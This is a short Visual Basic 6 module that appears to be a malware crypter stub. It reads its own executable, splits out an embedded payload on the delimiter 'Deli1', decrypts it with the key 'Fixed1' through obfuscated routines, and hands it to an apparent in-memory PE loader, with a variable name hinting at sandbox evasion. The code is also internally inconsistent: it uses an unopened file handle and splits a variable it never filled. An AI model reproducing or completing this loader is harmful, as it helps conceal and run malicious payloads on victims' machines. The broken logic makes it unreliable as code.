Attribute VB_Name = "modMain"
Private Sub Main()
Data = XtReMe
udncsmkdio = Space(LOF(1))
Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #C
Get #C, , udncsmkdio
Close #C
Dim lSandBoxie() As String
lSandBoxie() = Split(XtReMe, "Deli1")
lSandBoxie(1) = VKTTkrHE(lSandBoxie(1), "Fixed1")
PE.dLjBHpnD9DdSol7 App.Path & "\" & App.EXEName & ".exe", StrConv(lSandBoxie(1), vbFromUnicode), vbNullString
End Sub
